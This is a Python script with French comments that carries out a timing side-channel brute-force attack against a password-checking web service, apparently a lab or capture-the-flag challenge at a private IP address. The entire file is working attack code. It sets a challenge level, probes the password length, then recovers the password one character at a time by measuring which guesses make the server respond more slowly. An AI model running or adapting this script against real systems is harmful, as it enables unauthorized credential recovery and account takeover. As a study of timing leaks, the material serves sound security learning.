import requests
import string
from numpy import mean


class OnEstDesBrutes:
    car = string.ascii_letters + string.digits

    def __init__(self):
        self.password = ''
        self.last_time = 0
        self.password_len = 13
        self.url = "http://192.168.137.146:5000"

    def request_level(self, level: str):
        json = {
            "level": level
        }
        response = requests.post(url=self.url + '/level', json=json, verify=False)
        if response.status_code == 200:
            print(response.text)
        else:
            print(f'Erreur : {response.status_code} : {response.text}')
    
    def request_pwd(self, letter: str):
        json = {
            "password": (self.password + letter).ljust(self.password_len, '0')
        }
        print(f'\rPassword try: {json.get('password')}', end='')
        response = requests.post(url=self.url + '/check', json=json, verify=False)
        if response.status_code == 200 or response.json()['result']:
            if response.json()['result']['Valid']:
                print(f'Le mot de passe est: {self.password + letter}')
                return None
            return int(response.json()['result']['time'])
        else:
            print(f'Erreur : {response.status_code} : {response.text}')
            return
    
    def brute_force_len_password(self):
        while self.request_pwd('') == 0:
            self.password_len += 1
        print(f'\nLongueur password: {self.password_len}')
    
    def max_time(self, temps: list[int]) -> int | None:
        if len(temps) < 2:
            return
        i = temps.index(max(temps))
        tmp_mean = mean(temps[:i] + temps[i+1:])
        if temps[i] > tmp_mean + 15:
            return i
        
    def brute_force_char(self) -> None:
        time = []
        for l in self.car:
            t = -1
            while t < self.last_time:
                # Gère les erreurs si un temps est inormalement bas
                t = self.request_pwd(l)
                if t == None:
                    return
                print(f' - Time: {t}ms', end='')
            
            time.append(t)
            # Si un temps significatif prends ce caractère au lieu d'attendre la fin de tout les tests
            index = self.max_time(time)
            if index != None:
                break
        
        self.password += self.car[time.index(max(time))]
        self.last_time = max(time) - 20
        print(f'\rNew last_time: {self.last_time}', end='')
        return 1
    
    def brute_force_password(self):
        input('Appuyez sur Entrée pour commencer...')
        while self.brute_force_char():
            print(f'\n\nPassword start with: {self.password}')

a = OnEstDesBrutes()
a.request_level('1')
a.brute_force_len_password()
a.brute_force_password()